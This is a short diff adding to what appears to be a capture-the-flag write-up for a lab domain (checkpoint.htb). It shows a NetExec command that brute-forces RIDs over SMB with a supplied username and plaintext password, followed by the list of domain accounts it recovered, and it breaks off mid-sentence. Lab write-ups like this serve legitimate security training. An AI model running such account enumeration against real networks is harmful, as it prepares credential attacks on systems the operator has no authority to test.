@@ -119,5 +119,25 @@ Read access on a devdrop share, it stores VS code extensions
 
 ## Users
 ```python
-
+❯❯❯ nxc smb dc01.checkpoint.htb -u 'alex.turner' -p 'Checkpoint2024!' --smb-timeout 5 --rid-brute 20000 | grep SidTypeUser | cut -d '\' -f 2 | cut -d ' ' -f 1 | tee users.txt
+Administrator
+Guest
+krbtgt
+DC01$
+alex.turner
+ryan.brooks
+svc_deploy
+james.harper
+sarah.mitchell
+emily.carter
+david.reynolds
+jessica.coleman
+lauren.flores
+michael.torres
+kevin.patterson
+brian.jenkins
+megan.perry
+max.palmer
 ```
+
+Ill use `--rid-brute` to als
